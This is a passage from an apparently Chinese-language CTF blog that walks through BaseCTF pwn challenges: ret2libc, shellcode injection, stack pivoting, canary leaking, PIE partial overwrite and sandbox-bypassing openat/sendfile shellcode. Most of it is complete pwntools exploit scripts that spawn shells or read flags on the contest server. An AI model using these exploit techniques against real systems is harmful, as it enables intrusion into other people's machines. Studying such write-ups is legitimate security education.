class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20992</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi= <span class="number">0x401176</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0040101a</span></span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x401090</span> <span class="comment">#从start开始的</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) +p64(ret_addr)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;what should I do?\n&quot;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;what should I do?\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) +p64(ret_addr)+p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p> echo   是一个非常常用的命令行工具，用于在终端中显示文本或变量的值</p><p><code>$</code>最常见的用途是用于引用变量的值。当你在变量名前加上   <code>$</code>符号时，shell 会将变量的值替换到当前位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=$(&lt;/flag)        <span class="comment"># 从文件 /flag 中读取内容并赋值给变量 a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span>&quot;</span>          <span class="comment"># 打印变量 a 的内容</span></span><br><span class="line">BaseCTF&#123;61e35f3e-344f-4012-8cfa-1b2dece46fd4&#125;</span><br><span class="line">或直接</span><br><span class="line"><span class="variable">$a</span>                 <span class="comment">#将a当作命令执行</span></span><br><span class="line">/bin/bash: line 10: BaseCTF&#123;61e35f3e-344f-4012-8cfa-1b2dece46fd4&#125;: <span class="built_in">command</span> not found</span><br><span class="line"><span class="comment">#若执行ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">/bin/bash: line 4: <span class="built_in">ls</span>: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>先用两个字节输入syscall系统调用read接着利用read继续在buf中输入shellcode，read结束后rsp自动增加nop到shellcode上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;gz.imxbt.cn&#x27;,20003)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(shellcode)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">2</span>+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendline(shellcraft.sh())</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack-in-stack"><a href="#stack-in-stack" class="headerlink" title="stack _in_stack"></a>stack _in_stack</h2><p>栈迁移，有后门函数可以利用后门函数泄露libc，程序一开始会给buf的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;gz.imxbt.cn&#x27;,20113)</span></span><br><span class="line">io = process(</span><br><span class="line">    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span><br><span class="line">)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf=<span class="number">0x40129A</span></span><br><span class="line">secret=<span class="number">0x4011DD</span> <span class="comment">#可以泄露libc的后门函数</span></span><br><span class="line">main = <span class="number">0x40124A</span> <span class="comment">#这里并没有直接跳转到main函数的开头位置push rbp而是跳转到其下一条mov rsp，rbp</span></span><br><span class="line">leave_ret=<span class="number">0x4012F2</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;mick0960.\n&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(secret) + p64(<span class="number">0</span>) +p64(main) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(buf)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;mick0960.\n&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) <span class="comment">#经过栈迁移后buf的值改变了所以要重新接收一次</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf))</span><br><span class="line">ret = <span class="number">0x40101a</span>   <span class="comment">#ret是为了堆栈对齐</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(<span class="number">0</span>) + p64(buf) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="你为什么不让我溢出"><a href="#你为什么不让我溢出" class="headerlink" title="你为什么不让我溢出"></a>你为什么不让我溢出</h2><p>开了canary可以使用puts泄露canary，但是要注意puts会被’\x00’截断而canary的低位第一个字节为’\x00’所以要用a先覆盖掉该字节泄露canary再减去a还原canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20121</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#   [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>+<span class="number">1</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))-<span class="number">0x61</span></span><br><span class="line">getshell=<span class="number">0x4011B6</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+ p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(ret) +p64(getshell)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ python3 show.py</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>没开canary开了PIE</p><p>给了libc main函数存在栈溢出，printf可以用来泄露地址，关键就是如何二次调用main函数</p><p>在main函数执行前会执行<code>_libc_start_call_main</code> 来调用main函数，在main函数执行完后会<code>leave ret</code> <code>_libc_start_call_main + 128</code>处执行该处地址存放在栈上可以通过溢出泄露该地址获取libc</p><p>开了PIE的情况下libc的低12位字节也是不变的所以可以通过覆盖<code>_libc_start_call_main + 128</code>来尝试二次执行main函数</p><p>首先gdb调试先覆盖使其向前跳转找找有没有能用的gadget</p><p>注意在python脚本中使用gdb时开debug模式会导致程序提前结束进程gdb无法打开，所以下方把<code>context(arch=&#39;amd64&#39;,os = &#39;linux&#39;,log_level=&#39;debug&#39;)</code>给注释了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;gz.imxbt.cn&#x27;,20132)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#   [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b $rebase(0x11EE)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + <span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_addrs=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addrs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>跳转到0x7ffff7dafd3f &lt;__libc_start_call_main+47&gt;处</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf2.png" alt="1"></p><p>单步调试：</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf1.png" alt="1"></p><p>可以看到执行’\x89’ ‘\x8e’可以跳转到main函数，下方’\x90’即为正常情况跳转的位置</p><p>所以将’\x90’覆盖为’\x89’即可二次调用main函数</p><p>IDA中打开libc文件找到对应偏移</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf3.png" alt="1"></p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20422</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#   [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b $rebase(0x11EE)&#x27;)</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + <span class="string">b&#x27;\x89&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29D89</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x29139</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> +p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="orz"><a href="#orz" class="headerlink" title="orz!"></a>orz!</h2><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开了沙箱：</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/basectf4.png" alt="1"></p><p>orw都禁用了execve也禁用了啥都没有</p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your shellcode:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sandbox();</span><br><span class="line">  execute_shellcode(buf);</span><br><span class="line">  munmap(buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配了一段可读可写可执行的区域明显是想让我们写shellcode，可以用opeanat替换opean打开flag文件，看来两种思路</p><p>1：用opeanat打开flag文件，使用sendfile输出</p><p>程序调用   sendfile  ，将文件描述符   0x3   指向的文件内容发送到标准输出（文件描述符   0x1  ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e  ;flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi           </span></span><br><span class="line"><span class="string">    sub rdi, 100     ;rdi=-100表示为当前工作目录</span></span><br><span class="line"><span class="string">    mov rsi, rsp     ;rsi为flag</span></span><br><span class="line"><span class="string">    xor edx, edx     ;rdx=0只读模式</span></span><br><span class="line"><span class="string">    xor r10, r10     ;r10=0用于指定文件权限，0表示无额外参数</span></span><br><span class="line"><span class="string">    push 0x101</span></span><br><span class="line"><span class="string">    pop rax          ;rax=0x101</span></span><br><span class="line"><span class="string">    syscall          ;系统调用opeanat</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi,1        ;out_fd=0x1表示标准输出</span></span><br><span class="line"><span class="string">    mov rsi,3        ;in_fd=0x3前面打开的flag文件</span></span><br><span class="line"><span class="string">    push 0           </span></span><br><span class="line"><span class="string">    mov rdx,rsp      ;offset=0从文件的开头开始读取</span></span><br><span class="line"><span class="string">    mov r10,0x100    ;count=1024表示每次发送1024字节</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax          ;系统调用号为40</span></span><br><span class="line"><span class="string">    syscall          ;系统调用sendfile</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>文件描述符为什么是0x3呢？</p><p>因为标准输入流、输出流、错误流分别是0x0、0x1、0x2所以opeanat打开文件返回的文件描述符即为0x3</p><p>2：使用opeanat打开，readv读取，writev写出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/* openat */</span></span><br><span class="line"><span class="string">push <span class="subst">&#123;<span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)&#125;</span>; mov rax,0x<span class="subst">&#123;<span class="string">b&#x27;/flag.tx&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>;push rax;</span></span><br><span class="line"><span class="string">push rsp;   pop rsi;</span></span><br><span class="line"><span class="string">xor rdi,rdi;xor rdx,rdx;</span></span><br><span class="line"><span class="string">push 0x101; pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">/* ioc */</span></span><br><span class="line"><span class="string">push 0x70; </span></span><br><span class="line"><span class="string">push rsp;pop rax;add rax,0x10;push rax;push rsp;pop rsi;</span></span><br><span class="line"><span class="string">/* readv */</span></span><br><span class="line"><span class="string">push 3;  pop rdi;</span></span><br><span class="line"><span class="string">push 1;  pop rdx;</span></span><br><span class="line"><span class="string">push 19;pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">/* writev */</span></span><br><span class="line"><span class="string">push 1;  pop rdi;</span></span><br><span class="line"><span class="string">push 20; pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br></pre></td></tr></table></figure><p>对ioc的操作还是不太理解后续再遇到再深究</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20437</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#   [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: 